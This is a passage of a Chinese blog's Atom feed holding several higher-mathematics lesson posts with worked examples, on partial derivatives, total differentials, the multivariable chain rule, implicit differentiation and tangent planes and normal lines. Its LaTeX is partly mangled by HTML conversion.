z</em>{0}\right)\left(z-z_{0}\right)=0\end{align}$</p><p>法线方程</p><p>$\begin{align}\frac{x-x<em>{0}}{F</em>{x}\left(x<em>{0}, y</em>{0}, z<em>{0}\right)}=\frac{y-y</em>{0}}{F<em>{y}\left(x</em>{0}, y<em>{0}, z</em>{0}\right)}=\frac{z-z<em>{0}}{F</em>{z}\left(x<em>{0}, y</em>{0}, z_{0}\right)}\end{align}$</p><p>曲面法向量</p><p>$\begin{align}\vec n=\left(F<em>{x}\left(x</em>{0}, y<em>{0}, z</em>{0}\right), F<em>{y}\left(x</em>{0}, y<em>{0}, z</em>{0}\right), F<em>{z}\left(x</em>{0}, y<em>{0}, z</em>{0}\right)\right)\end{align}$</p><p>曲面$z=f(x,y)$的情形</p><p>令$F(x,y,z)=f(x,y)-z=0$可见</p><p>$\begin{align}F<em>{x}(x, y, z)=f</em>{x}(x, y), F<em>{y}(x, y, z)=f</em>{y}(x, y), F_{z}(x, y, z)=-1\end{align}$</p><p>切平面方程为</p><p>$\begin{align}f<em>{x}\left(x</em>{0}, y<em>{0}\right)\left(x-x</em>{0}\right)+f<em>{y}\left(x</em>{0}, y<em>{0}\right)\left(y-y</em>{0}\right)-\left(z-z_{0}\right)=0\end{align}$</p><p>法线方程为</p><p>$\begin{align}\frac{x-x<em>{0}}{f</em>{x}\left(x<em>{0}, y</em>{0}\right)}=\frac{y-y<em>{0}}{f</em>{y}\left(x<em>{0}, y</em>{0}\right)}=\frac{z-z_{0}}{-1}\end{align}$</p><p>方向余弦</p><p>$\begin{align}\cos \alpha=\frac{-f<em>{x}}{\sqrt{1+f</em>{x}^{2}+f<em>{y}^{2}}}, \quad \cos \beta=\frac{-f</em>{y}}{\sqrt{1+f<em>{x}^{2}+f</em>{y}^{2}}}, \quad \cos \gamma=\frac{1}{\sqrt{1+f<em>{x}^{2}+f</em>{y}^{2}}}\end{align}$</p><h3 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h3><p>求球面$x^{2}+y^{2}+z^{2}=14$在点$(1,2,3)$处的切平面及法线方程</p><p>$\begin{align}F(x,y,z)=x^{2}+y^{2}+z^{2}-14\end{align}$</p><p>$\begin{align}F_x=2x,F_y=2y,F_z=2z\end{align}$</p><p>所以</p><p>$\begin{align}\left.\vec{n}\right|_{(1,2,3)}=(2,4,6)\end{align}$</p><p>所以在点$(1,2,3)$处此球面的切平面方程为</p><p>$\begin{align}2(x-1)+4(y-2)+6(z-3)=0\end{align}$</p><p>即</p><p>$\begin{align}x+2y+3z-14=0\end{align}$</p><p>法线方程为</p><p>$\begin{align}\frac{x-1}{1}=\frac{y-2}{2}=\frac{z-3}{3}\end{align}$</p><p>即</p><p>$\begin{align}\frac{x}{1}=\frac{y}{2}=\frac{z}{3}\end{align}$</p><p>由此可见,法线经过原点(即球心)</p><hr><p>求旋转抛物面$z=x^{2}+y^{2}-1$在点$(2,1,4)$处的切平面及法线方程</p><p>$\begin{align}f(x,y)=x^{2}+y^{2}-1\end{align}$</p><p>$\begin{align}&amp;\vec{n}=\left(f<em>{x},f</em>{y},-1\right)=(2x,2y,-1)\&amp;\left.\vec{n}\right|_{(2,1,4)}=(4,2,-1)\end{align}$</p><p>所以在点$(2,1,4)$处的切平面方程为</p><p>$\begin{align}4(x-2)+2(y-1)-(z-4)=0\end{align}$</p><p>即</p><p>$\begin{align}4x+2y-z-6=0\end{align}$</p><p>法线方程为</p><p>$\begin{align}\frac{x-2}{4}=\frac{y-1}{2}=\frac{z-4}{-1}\end{align}$</p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="高等数学" scheme="https://www.ascotbe.com/categories/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/"/>
    
    
    <category term="高数" scheme="https://www.ascotbe.com/tags/%E9%AB%98%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>隐函数求导</title>
    <link href="https://www.ascotbe.com/2023/06/24/FurtherMathematics_0xE/"/>
    <id>https://www.ascotbe.com/2023/06/24/FurtherMathematics_0xE/</id>
    <published>2023-06-24T15:58:53.000Z</published>
    <updated>2023-06-26T08:56:46.079Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/0_E.png" alt="8e46afc9cf60064d25e129aadf91f678" style="zoom:33%;" /></p><h2 id="隐函数的类型"><a href="#隐函数的类型" class="headerlink" title="隐函数的类型"></a>隐函数的类型</h2><h3 id="一个方程情形"><a href="#一个方程情形" class="headerlink" title="一个方程情形"></a>一个方程情形</h3><h4 id="二元方程"><a href="#二元方程" class="headerlink" title="二元方程"></a>二元方程</h4><p>设函数$F(x,y)$在点$P\left(x<em>{0},y</em>{0}\right)$的某一领域内具有连续偏导数，且</p><ul><li><p>$F(x<em>{0},y</em>{0})=0$</p></li><li><p>$F<em>{y}\left(x</em>{0},y_{0}\right)\neq0$</p><p>注：$F_y\neq0\Longrightarrow y=y(x)$相应的$F_x\neq0\Longrightarrow x=x(y)$</p></li></ul><p>则方程$F(x,y)=0$在点$\left(x<em>{0},y</em>{0}\right)$的某一领域内恒能唯一确定</p><p>一个连续且有连续偏导的函数$y=y(x)$，它满足$y<em>{0}=y\left(x</em>{0}\right)$，且</p><p>$\begin{align}\frac{dy}{dx}=-\frac{F<em>{x}}{F</em>{y}}\end{align}$</p><div class="note success modern"><p>$F_x,F_y$指的是二元函数$F(x,y)$对$x,y$的偏导数</p></div><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/89.png" alt="下载"></p><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><h4 id="三元函数"><a href="#三元函数" class="headerlink" title="三元函数"></a>三元函数</h4><p>设函数$F(x,y,z)$在点$P\left(x<em>{0},y</em>{0},z_{0}\right)$的某一领域内具有连缘偏导数，且</p><ul><li><p>$F(x<em>{0},y</em>{0},z_{0})=0$</p></li><li><p>$F<em>{z}(x</em>{0},y<em>{0},z</em>{0})\neq0$</p><p>注：$F_z\neq0\Longrightarrow z=z(x,y)$相应的$F_x\neq0\Longrightarrow x=x(y,z)$同理$F_y\neq0\Longrightarrow y=y(z,x)$</p></li></ul><p>则方程$F(x,y,z)=0$在点$P$的某一领域中恒能唯一确定一个连续且具有连续偏导数的函数$z=z(x,y)$，满足$z<em>{0}=z(x</em>{0},y_{0})$且</p><p>$\begin{align}&amp;\frac{\partial z}{\partial x}=-\frac{F<em>{x}}{F</em>{z}}\&amp;\frac{\partial z}{\partial y}=-\frac{F<em>{y}}{F</em>{z}}\end{align}$</p><h4 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h4><p>已知设$^{2}+y^{2}+z^{2}-4z=0$，求$\frac{\partial^{2}z}{\partial x^{2}}$</p><p>设$F(x,y,z)=x^{2}+y^{2}+z^{2}-4z$，则$F<em>{x}=2x,F</em>{y}=2y,F_{z}=2z-4$。当$z\neq2$时，应得</p><p>$\begin{align}\frac{\partial z}{\partial x}=-\frac{F<em>{x}}{F</em>{z}}=\frac{x}{2-z}\end{align}$</p><p>再一次对$x$求偏导数（需要把$z$看做$z(x,y)$，不要把$z$看做常数），得</p><p>$\begin{align}\frac{\partial^{2}z}{\partial x^{2}}=\frac{(2-z)+x\frac{\partial z}{\partial x}}{(2-z)^{2}}=\frac{(2-z)+x\left(\frac{x}{2-z}\right)}{(2-z)^{2}}=\frac{(2-z)^{2}+x^{2}}{(2-z)^{3}}\end{align}$</p><h3 id="方程组情形"><a href="#方程组情形" class="headerlink" title="方程组情形"></a>方程组情形</h3><h4 id="四元方程组"><a href="#四元方程组" class="headerlink" title="四元方程组"></a>四元方程组</h4><p>设$F(x,y,u,v),G(x,y,u,v)$在点$P(x<em>{0},y</em>{0},u<em>{0},v</em>{0})$的某一领域内具有对各个变量的连续偏导数且</p><ul><li><p>$F\left(x<em>{0},y</em>{0},u<em>{0},v</em>{0}\right)=0,G\left(x<em>{0},y</em>{0},u<em>{0},v</em>{0}\right)=0$</p></li><li><p>$F,G$对$u,v$的雅可比（Jacobi）行列式在$P$处不为0</p><p>$\begin{align}J=\frac{\partial(F,G)}{\partial(u,v)}=\left|\begin{array}{ll}F<em>{u}&amp;F</em>{v}\G_{u}&amp;G_v\end{array}\right|\neq0\end{align}$</p></li></ul><p>则方程组$F(x,y,u,v)=0,G(x,y,u,v)=0$在$P$的某领域内能唯一确定一组连续且有连续偏导数的函数$u=u(x,y),v=v(x,y)$，满足$u<em>{0}=u\left(x</em>{0},y<em>{0}\right),v</em>{0}=v\left(x<em>{0},y</em>{0}\right)$且</p><p>$\begin{align}&amp;\frac{\partial u}{\partial x}=-\frac{1}{J} \frac{\partial(F, G)}{\partial(x, v)}=-\frac{\left|\begin{array}{ll}F<em>{x} &amp; F</em>{v} \G<em>{x}&amp;G</em>{v}\end{array}\right|}{\left|\begin{array}{cc}F<em>{u} &amp; F</em>{v} \G<em>{u} &amp; G</em>{v}\end{array}\right|}\&amp;\frac{\partial v}{\partial x}=-\frac{1}{J} \frac{\partial(F, G)}{\partial(u, x)} \&amp;\frac{\partial u}{\partial y}=-\frac{1}{J} \frac{\partial(F, G)}{\partial(y, v)}\&amp; \frac{\partial v}{\partial y}=-\frac{1}{J} \frac{\partial(F, G)}{\partial(u, y)} \end{align}$</p><h4 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h4><p>设$xu-yv=0,yu+xv=1$，求$\frac{\partial u}{\partial x},\frac{\partial u}{\partial y},\frac{\partial v}{\partial x}$和$\frac{\partial v}{\partial y}$</p><p>将所给方程的两边对$x$求导并移项，得</p><p>$\begin{align}{\begin{array}{l}<br>x \frac{\partial u}{\partial x}-y \frac{\partial v}{\partial x}=-u \<br>y \frac{\partial u}{\partial x}+x \frac{\partial v}{\partial x}=-v \end{array}\end{align}$</p><p>在 $J=\left|\begin{array}{rr}x &amp; -y \ y &amp; x\end{array}\right|=x^{2}+y^{2} \neq 0$的条件下</p><p>$\begin{align}\begin{array}{l}<br>\frac{\partial u}{\partial x}=\frac{\left|\begin{array}{rr}<br>-u &amp; -y \<br>-v &amp; x<br>\end{array}\right|}{\left|\begin{array}{rr}<br>x &amp; -y \<br>y &amp; x<br>\end{array}\right|}=-\frac{x u+y v}{x^{2}+y^{2}} \<br>\frac{\partial v}{\partial x}=\frac{\left|\begin{array}{rr}<br>x &amp; -u \<br>y &amp; -v<br>\end{array}\right|}{\left|\begin{array}{rr}<br>x &amp; -y \<br>y &amp; x<br>\end{array}\right|}=\frac{y u-x v}{x^{2}+y^{2}}<br>\end{array}\end{align}$</p><p>将所给方程的两边对$y$求导。用同样方法在$J=x^{2}+y^{2} \neq 0$的条件下可得</p><p>$\begin{align}\frac{\partial u}{\partial y}=\frac{x v-y u}{x^{2}+y^{2}}, \quad \frac{\partial v}{\partial y}=-\frac{x u+y v}{x^{2}+y^{2}}\end{align}$</p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="高等数学" scheme="https://www.ascotbe.com/categories/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/"/>
    
    
    <category term="高数" scheme="https://www.ascotbe.com/tags/%E9%AB%98%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>多元复合函数求导法则</title>
    <link href="https://www.ascotbe.com/2023/06/18/FurtherMathematics_0xD/"/>
    <id>https://www.ascotbe.com/2023/06/18/FurtherMathematics_0xD/</id>
    <published>2023-06-18T15:58:53.000Z</published>
    <updated>2023-06-19T02:03:12.845Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/0_D.png" alt="fd1d2cdec79d8a0027fb8b3db294dc93"></p><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>一元复合函数：$y=f(\varphi(x)) \Leftrightarrow y=f(u), u=\varphi(x)$</p><p>其求导有链式法则：$\frac{\mathrm{d} y}{\mathrm{~d} x}=\frac{\mathrm{d} y}{\mathrm{~d} u} \frac{\mathrm{d} u}{\mathrm{~d} x}$</p><p>画出函数关系图：$y\rightarrow u\rightarrow x$，可见从$y$到x$$有一条路径,所以结果是1项的和，每一段路径（对应一个导数）乘起来。</p><h2 id="全导数"><a href="#全导数" class="headerlink" title="全导数"></a>全导数</h2><h3 id="一元函数与多元函数复合的情形"><a href="#一元函数与多元函数复合的情形" class="headerlink" title="一元函数与多元函数复合的情形"></a>一元函数与多元函数复合的情形</h3><p>如果函数$u=\varphi(t)$及$v=\psi(t)$都在点$t$可导，函数$z=f(u, v)$在对应 点$(u, v)$具有连续偏导数，那么复合函数$z=f[\varphi(t), \psi(t)]$在点$t$可导，且有</p><p>$\begin{align}\frac{\mathrm{d} z}{\mathrm{~d} t}=\frac{\partial z}{\partial u}\cdot\frac{\mathrm{d} u}{\mathrm{~d} t}+\frac{\partial z}{\partial v} \cdot\frac{\mathrm{d} v}{\mathrm{~d} t}\end{align}$</p><div class="note success modern"><p>注意：$\partial$的表示偏导数，$\mathrm{d}$表示一元函数的导数</p></div><h3 id="多元函数与多元函数复合的情形"><a href="#多元函数与多元函数复合的情形" class="headerlink" title="多元函数与多元函数复合的情形"></a>多元函数与多元函数复合的情形</h3><p>如果函数$u=\varphi(x,y)$及$v=\psi(x,y)$都在点$(x,y)$具有对$x$及对$y$的偏导数，函数$z=f(u,v)$在对应点$(u,v)$具有连续偏导数，那么复合函数$z=f[\varphi(x,y),\psi(x,y)]$在点$(x,y)$的两个偏导数都存在，且有</p><p>$\begin{align}<br>\frac{\partial z}{\partial x}=\frac{\partial z}{\partial u} \frac{\partial u}{\partial x}+\frac{\partial z}{\partial v} \frac{\partial v}{\partial x} \<br>\frac{\partial z}{\partial y}=\frac{\partial z}{\partial u} \frac{\partial u}{\partial y}+\frac{\partial z}{\partial v} \frac{\partial v}{\partial y}<br>\end{align}$</p><h3 id="混合情形"><a href="#混合情形" class="headerlink" title="混合情形"></a>混合情形</h3><p>如果函数$u=\varphi(x,y)$在点$(x,y)$具有对$x$及对$y$的偏导数，函数$v=\psi(y)$在点$y$可导，函数$z=f(u,v)$在对应点$(u,v)$具有连续偏导数，那么复合函数$z=f[\varphi(x,y),\psi(y)]$在点$(x,y)$的两个偏导数都存在，且有</p><p>$\begin{align}<br>&amp;\frac{\partial z}{\partial x}=\frac{\partial z}{\partial u} \frac{\partial u}{\partial x} \&amp;<br>\frac{\partial z}{\partial y}=\frac{\partial z}{\partial u} \frac{\partial u}{\partial y}+\frac{\partial z}{\partial v} \frac{\mathrm{d} v}{\mathrm{~d} y}<br>\end{align}$</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>设$z=u^{2} e^{v}, \quad u=\sin t, \quad v=e^{t}$。求$\frac{d z}{d t}$</p><p>$\begin{aligned}<br>\frac{d z}{d t} &amp; =\frac{\partial z}{\partial u} \cdot \frac{d u}{d t}+\frac{\partial z}{\partial v} \cdot \frac{d v}{d t} \<br>&amp; =2 u e^{v} \cdot \cos t+u^{2} e^{v} \cdot e^{t} \<br>&amp; =2 \sin t \cdot e^{e^{t}} \cdot \cos t+\sin ^{2} t \cdot e^{e^{t}} \cdot e^{t}<br>\end{aligned}$</p><hr><p>设$z=\mathrm{e}^{u}\sin v$，而$u=xy,v=x+y$。求$\frac{\partial z}{\partial x}$和$\frac{\partial z}{\partial y}$</p><p>$\begin{align}<br>\frac{\partial z}{\partial x} &amp; =\frac{\partial z}{\partial u} \frac{\partial u}{\partial x}+\frac{\partial z}{\partial v} \frac{\partial v}{\partial x}=\mathrm{e}^{u} \sin v \cdot y+\mathrm{e}^{u} \cos v \cdot 1 \<br>&amp; =\mathrm{e}^{x y}[y \sin (x+y)+\cos (x+y)] \<br>\frac{\partial z}{\partial y} &amp; =\frac{\partial z}{\partial u} \frac{\partial u}{\partial y}+\frac{\partial z}{\partial v} \frac{\partial v}{\partial y}=\mathrm{e}^{u} \sin v \cdot x+\mathrm{e}^{u} \cos v \cdot 1 \<br>&amp; =\mathrm{e}^{\mathrm{x} y}[x \sin (x+y)+\cos (x+y)]<br>\end{align}$</p><hr><p>设$u=f(x,y,z)=\mathrm{e}^{x^{2}+y^{2}+z^{2}}$，而$z=x^{2}\sin y$。求$\frac{\partial u}{\partial x}$和$\frac{\partial u}{\partial y}$</p><p>$\begin{align}<br>\frac{\partial u}{\partial x} &amp; =\frac{\partial f}{\partial x}+\frac{\partial f}{\partial z} \frac{\partial z}{\partial x}=2 x \mathrm{e}^{x^{2}+y^{2}+z^{2}}+2 z \mathrm{e}^{x^{2}+y^{2}+z^{2}} \cdot 2 x \sin y \<br>&amp; =2 x\left(1+2 x^{2} \sin ^{2} y\right) \mathrm{e}^{x^{2}+y^{2}+x^{4} \sin ^{2} y}  \<br>\frac{\partial u}{\partial y} &amp; =\frac{\partial f}{\partial y}+\frac{\partial f}{\partial z} \frac{\partial z}{\partial y}=2 y \mathrm{e}^{x^{2}+y^{2}+z^{2}}+2 z \mathrm{e}^{x^{2}+y^{2}+z^{2}} \cdot x^{2} \cos y \<br>&amp; =2\left(y+x^{4} \sin y \cos y\right) \mathrm{e}^{x^{2}+y^{2}+x^{4} \sin ^{2} y}<br>\end{align}$</p><hr><p>设$z=f(u,v,t)=uv+\sin t$，而$u=\mathrm{e}^{t},v=\cos t$。求全导数$\frac{\mathrm{d}z}{\mathrm{~d}t}$</p><p>$\begin{align}<br>\frac{\mathrm{d} z}{\mathrm{~d} t} &amp; =\frac{\partial f}{\partial u} \frac{\mathrm{d} u}{\mathrm{~d} t}+\frac{\partial f}{\partial v} \frac{\mathrm{d} v}{\mathrm{~d} t}+\frac{\partial f}{\partial t}=v \mathrm{e}^{t}-u \sin t+\cos t \<br>&amp; =\mathrm{e}^{t} \cos t-\mathrm{e}^{t} \sin t+\cos t=\mathrm{e}^{t}(\cos t-\sin t)+\cos t<br>\end{align}$</p><h2 id="抽象复合函数求偏导"><a href="#抽象复合函数求偏导" class="headerlink" title="抽象复合函数求偏导"></a>抽象复合函数求偏导</h2><p>为了写法和计算上的方便，引入记导：</p><p>$\begin{align}<br>f(u, v):\left{\begin{array}{l}<br>f<em>{u}^{\prime} \rightarrow f</em>{1}^{\prime}, f<em>{v}^{\prime} \rightarrow f</em>{2}^{\prime} \<br>f<em>{u u}^{\prime \prime} \rightarrow f</em>{11}^{\prime \prime}, f<em>{u v}^{\prime \prime} \rightarrow f</em>{12}^{\prime \prime}, \cdots\end{array}\right.<br>\end{align}$</p><p>$\begin{align}f(u, v, w):\left{\begin{array}{l}<br>f<em>{u}^{\prime} \rightarrow f</em>{1}^{\prime \prime}, f<em>{v}^{\prime} \rightarrow f</em>{2}^{\prime}, f<em>{w}^{\prime} \rightarrow f</em>{3}^{\prime}  \<br>f<em>{u v}^{\prime \prime} \rightarrow f</em>{12}^{\prime \prime}, f<em>{v w}^{\prime \prime} \rightarrow f</em>{23}^{\prime \prime}, \cdots<br>\end{array}\right.<br>\end{align}$</p><h2 id="全微分形式不变性"><a href="#全微分形式不变性" class="headerlink" title="全微分形式不变性"></a>全微分形式不变性</h2><p>全微分形式不变性设函数$z=f(u,v)$具有连续偏导数，则有全微分</p><p>$\begin{align}\mathrm{d} z=\frac{\partial z}{\partial u} \mathrm{~d} u+\frac{\partial z}{\partial v} \mathrm{~d} v\end{align}$</p><p>如果$u$和$v$又是中间变量，即$u=\varphi(x,y),v=\psi(x,y)$，且这两个函数也具有连续偏导数，那么复合函数</p><p>$\begin{align}z=f[\varphi(x, y), \psi(x, y)]\end{align}$</p><p>的全微分为</p><p>$\begin{align}\mathrm{d} z=\frac{\partial z}{\partial x} \mathrm{~d} x+\frac{\partial z}{\partial y} \mathrm{~d} y\end{align}$</p><p>由此可见，无论$u$和$v$是自变量还是中间变量，还是$z=f(u,v)$的全微分形式是一样的。这个性质叫做全微分形式不变性</p><h3 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h3><p>利用全微分形式不变性解本节的例题2。设$z=\mathrm{e}^{u}\sin v$，而$u=xy,v=x+y$。求$\frac{\partial z}{\partial x}$和$\frac{\partial z}{\partial y}$</p><p>$\mathrm{d} z=\mathrm{d}\left(\mathrm{e}^{u} \sin v\right)=\mathrm{e}^{u} \sin v \mathrm{~d} u+\mathrm{e}^{u} \cos v \mathrm{~d} v$</p><p>因为</p><p>$\mathrm{d} u=\mathrm{d}(x y)=y \mathrm{~d} x+x \mathrm{~d} y, \mathrm{~d} v=\mathrm{d}(x+y)=\mathrm{d} x+\mathrm{d} y$</p><p>代人后归并含$\mathrm{d}x$及$\mathrm{d}y$的项，得</p><p>$\mathrm{d} z=\left(\mathrm{e}^{u} \sin v \cdot y+\mathrm{e}^{u} \cos v\right) \mathrm{d} x+\left(\mathrm{e}^{u} \sin v \cdot x+\mathrm{e}^{u} \cos v\right) \mathrm{d} y$</p><p>即</p><p>$\begin{align}<br>&amp;\frac{\partial z}{\partial x} \mathrm{~d} x+\frac{\partial z}{\partial y} \mathrm{~d} y \<br>&amp;=  \mathrm{e}^{x y}[y \sin (x+y)+\cos (x+y)] \mathrm{d} x+\mathrm{e}^{x y}[x \sin (x+y)+\cos (x+y)] \mathrm{d} y<br>\end{align}$</p><p>比较上式两边的$\mathrm{d}x$和$\mathrm{d}y$的系数,就同时得到两个偏导数$\frac{\partial z}{\partial x}$和$\frac{\partial z}{\partial y}$，它们与上面的结果一样</p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="高等数学" scheme="https://www.ascotbe.com/categories/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/"/>
    
    
    <category term="高数" scheme="https://www.ascotbe.com/tags/%E9%AB%98%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>偏导数与全微分</title>
    <link href="https://www.ascotbe.com/2023/06/11/FurtherMathematics_0xC/"/>
    <id>https://www.ascotbe.com/2023/06/11/FurtherMathematics_0xC/</id>
    <published>2023-06-11T15:58:53.000Z</published>
    <updated>2023-08-03T05:56:48.038Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/0_C.png" alt="927d8d5473dc4cede224f43ca544f78a"></p><h2 id="偏导数"><a href="#偏导数" class="headerlink" title="偏导数"></a>偏导数</h2><p>函数$f(x,y)$在点$x_0,y_0$关于$x$的偏导数：</p><p>$\begin{align}f<em>{x}\left(x</em>{0}, y<em>{0}\right) =\left.\frac{\partial f}{\partial x}\right|</em>{(x<em>0,y_0)}=\left.\frac{\mathrm{d}}{\mathrm{d}x}f(x,y_0)\right|</em>{x=x<em>0}=\lim </em>{\Delta x \rightarrow 0} \frac{f\left(x<em>{0}+\Delta x, y</em>{0}\right)-f\left(x<em>{0}, y</em>{0}\right)}{\Delta x}\end{align}$</p><p>关于$y$的偏导数为：</p><p>$\begin{align}f<em>{y}\left(x</em>{0}, y<em>{0}\right)=\left.\frac{\partial f}{\partial y}\right|</em>{(x<em>0,y_0)}=\left.\frac{\mathrm{d}}{\mathrm{d}y}f(x_0,y)\right|</em>{y=y<em>0}=\lim </em>{\Delta y \rightarrow 0} \frac{f\left(x<em>{0}, y</em>{0}+\Delta y\right)-f\left(x<em>{0}, y</em>{0}\right)}{\Delta y}\end{align}$</p><h3 id="偏导数的几何意义"><a href="#偏导数的几何意义" class="headerlink" title="偏导数的几何意义"></a>偏导数的几何意义</h3><div class="note success modern"><p>偏导数为函数在每个位置处沿着自变量坐标轴方向上的导数（切线斜率）。如果对$x$求导就是$y$值不变，$x$变化率的切线斜率，例子如下图</p></div><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/88.png" alt="\frac{\partial f}{\partial x}为常数的曲线的导数"></p><p>以二元函数为例，令$z=f(x,y)$，绘制在3维坐标系如下图所示</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/91.png" alt="z = f(x, y)"></p><p>在分别固定$y$和$x$的取值后得到下图中的黑色曲线——“退化”为一元函数，二维坐标系中的曲线——则<strong>偏导数</strong>$\frac{\partial z}{\partial x},\frac{\partial z}{\partial y}$分别为<strong>曲线的导数（切线斜率）</strong>。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/92.png" alt="partial derivative x"></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/93.png" alt="partial derivative y"></p><p>由上可知，一个变量对应一个坐标轴，<strong>偏导数为函数在每个位置处沿着自变量坐标轴方向上的导数（切线斜率）</strong></p><p>视频的话可以看下面</p><iframe src="//player.bilibili.com/player.html?aid=19844108&bvid=BV1sW411775X&cid=32363257&page=1&autoplay=0" width="780" height="480" scrolling="true" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe><h3 id="偏导数的求法"><a href="#偏导数的求法" class="headerlink" title="偏导数的求法"></a>偏导数的求法</h3><p>对于$z=f(x,y)$求偏导$\frac{\partial z}{\partial x},\frac{\partial z}{\partial y}$</p><p>$\frac{\partial z}{\partial x}$：将$y$看做常量，而对$x$求导</p><p>$\frac{\partial z}{\partial y}$：将$x$看做常量，而对$y$求导</p><h3 id="N元函数的偏导数"><a href="#N元函数的偏导数" class="headerlink" title="N元函数的偏导数"></a>N元函数的偏导数</h3><p>偏导数的概念还可推广到二元以上的函数。例如三元函数$u=f(x,y,z)$在点$(x,y,z)$处对$x$的偏导数定义为</p><p>$\begin{align}f<em>{x}(x,y,z)=\lim</em>{\Delta x \rightarrow 0}\frac{f(x+\Delta x,y,z)-f(x,y,z)}{\Delta x}\end{align}$</p><p>其中$(x,y,z)$是函数$u=f(x,y,z)$的定义域的内点。它们的求法也仍旧是一元函数的微分法问题。</p><h4 id="求导方法"><a href="#求导方法" class="headerlink" title="求导方法"></a>求导方法</h4><p>$z=f(x,y)$，偏导数有2个：$\frac{\partial z}{\partial x},\frac{\partial z}{\partial y}$</p><p>$u=f(x,y,z)$，偏导数有3个：$\frac{\partial u}{\partial x},\frac{\partial u}{\partial y},\frac{\partial u}{\partial z}$</p><h3 id="偏导数例题"><a href="#偏导数例题" class="headerlink" title="偏导数例题"></a>偏导数例题</h3><p>例1：求$z=x^{2}+3xy+y^{2}$在点$(1,2)$处的偏导数。</p><p>解：把$y$看做常量，得</p><p>$\begin{align}\frac{\partial z}{\partial x}=2x+3y\end{align}$</p><p>把$x$看做常量，得</p><p>$\begin{align}\frac{\partial z}{\partial y}=3x+2y\end{align}$</p><p>将$(1,2)$代人上面的结果，就得</p><p>$\begin{align}\left.\frac{\partial z}{\partial x}\right|<em>{\substack{x=1\y=2}}=2\cdot 1+3\cdot2=8\\left.\frac{\partial z}{\partial y}\right|</em>{\substack{x=1\y=2}}=3\cdot 1+2\cdot 2=7\end{align}$</p><p>例2：求$z=x^{2}\sin2y$的偏导数。</p><p>解：</p><p>$\begin{align}&amp;\frac{\partial z}{\partial x}=2x\sin2y\&amp;\frac{\partial z}{\partial y}=2x^{2}\cos2y\end{align}$</p><p>例3：求$r=\sqrt{x^{2}+y^{2}+z^{2}}$的偏导数.</p><p>解：因为函数是复合函数，先把根号里面的内容看做一个整体，进行求导</p><p>$(\sqrt{u})^{\prime}=\frac{1}{2\sqrt{u}}$，然后所以需要把$y$和$z$都看做常量，再次对$u$求导$u=x^2+y^2+z^2$，得到下面公式</p><p>$\begin{align}\frac{\partial r}{\partial x}=\frac{2x}{2\sqrt{x^{2}+y^{2}+z^{2}}}=\frac{x}{\sqrt{x^{2}+y^{2}+z^{2}}}=\frac{x}{r}\end{align}$</p><p>同理其他偏导数也可以一样带入，得出$\frac{\partial r}{\partial y}=\frac{y}{r},\frac{\partial r}{\partial z}=\frac{z}{r}$</p><h3 id="高阶偏导数"><a href="#高阶偏导数" class="headerlink" title="高阶偏导数"></a>高阶偏导数</h3><p>设函数$z=f(x,y)$在区域$D$内具有偏导数</p><p>$\frac{\partial z}{\partial x}=f<em>{x}(x,y),\quad\frac{\partial z}{\partial y}=f</em>{y}(x,y)$</p><p>于是在$D$内$f<em>{x}(x,y),f</em>{y}(x,y)$都是$x,y$的函数。如果这两个函数的偏导数也存在，那么称它们是函数$z=f(x,y)$的二阶偏导数。按照对变量求导次序的不同有下列四个二阶偏导数：</p><p>$\begin{align}&amp;\frac{\partial}{\partial x}\left(\frac{\partial z}{\partial x}\right)=\frac{\partial(\frac{\partial z}{\partial x})}{\partial x}=\frac{\partial^{2} z}{\partial x^{2}}=f<em>{x x}(x, y)\&amp; \frac{\partial}{\partial y}\left(\frac{\partial z}{\partial x}\right)=\frac{\partial(\frac{\partial z}{\partial x})}{\partial y}=\frac{\partial^{2} z}{\partial x \partial y}=f</em>{x y}(x, y)\&amp;<br>\frac{\partial}{\partial x}\left(\frac{\partial z}{\partial y}\right)=\frac{\partial(\frac{\partial z}{\partial y})}{\partial x}=\frac{\partial^{2} z}{\partial y \partial x}=f<em>{y x}(x, y)\ &amp;\frac{\partial}{\partial y}\left(\frac{\partial z}{\partial y}\right)=\frac{\partial(\frac{\partial z}{\partial y})}{\partial y}=\frac{\partial^{2} z}{\partial y^{2}}=f</em>{y y}(x, y)\end{align}$</p><p>上面第二个和第三个公式为混合偏导</p><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p>设$z=x^{3}y^{2}-3xy^{3}-xy+1$，求$\frac{\partial^{2} z}{\partial x^{2}},\frac{\partial^{2} z}{\partial y\partial x},\frac{\partial^{2} z}{\partial x\partial y},\frac{\partial^{2} z}{\partial y^{2}},\frac{\partial^{3} z}{\partial x^{3}}$</p><p>$\begin{align}<br>&amp;\frac{\partial z}{\partial x}=3 x^{2} y^{2}-3 